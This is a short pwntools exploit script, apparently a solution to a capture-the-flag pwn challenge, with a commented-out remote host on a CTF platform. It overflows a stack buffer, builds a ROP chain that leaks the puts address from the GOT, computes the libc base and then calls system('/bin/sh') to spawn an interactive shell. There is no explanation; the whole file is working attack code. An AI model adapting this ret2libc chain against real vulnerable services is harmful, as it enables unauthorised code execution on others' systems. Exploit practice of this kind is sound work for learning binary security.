from pwn import *

sh = process('./pwn')
# sh = remote('node5.buuoj.cn', 28698)
elf = ELF('./pwn')
libc = ELF('./libc-2.31.so')

offset = 40
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = 0x400698
pop_rdi = 0x400753
ret_addr = 0x40050e

payload1 = b'a'*offset + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)

sh.sendlineafter(b'Glad to meet you again!What u bring to me this time?', payload1)
puts_addr = u64(sh.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))

print(hex(puts_addr))

libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search('/bin/sh'))

payload2 = b'a'*40 + p64(pop_rdi) + p64(bin_sh_addr) + p64(ret_addr) + p64(system_addr) 
sh.sendline(payload2)
sh.interactive()